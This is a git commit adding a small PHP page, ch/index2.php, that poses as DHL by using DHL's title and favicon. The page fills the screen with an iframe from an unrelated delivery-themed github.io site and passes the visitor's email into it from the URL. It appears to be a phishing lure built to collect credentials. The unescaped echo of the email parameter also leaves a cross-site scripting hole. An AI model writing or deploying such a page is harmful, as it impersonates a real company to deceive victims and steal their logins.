0935c17759d0e595db4a2a3b4cab420695f45aa3
getthemal <54301771+getthemal@users.noreply.github.com>
2019-08-20 05:47:55 +0100

    Add files via upload

---
+++ ch/index2.php
@@ -0,0 +1,31 @@
+<html><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<title>
+	DHL
+</title><link rel="icon" href="https://www.logistics.dhl/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico" type="image/x-icon">
+
+
+        <style type="text/css">
+            body
+            {
+                margin:   0;
+                overflow: hidden;
+            }
+
+            #iframe1
+            {
+                height:   100%;
+                left:     0px;
+                position: absolute;
+                top:      0px;
+                width:    100%;
+            }
+        </style>
+    </head>
+
+    <body>
+        <iframe id="iframe1" src="https://shielduled-delivery.github.io/index.html?email=<?=$_GET[email]?>" frameborder="0"></iframe>
+    
+</body></html>
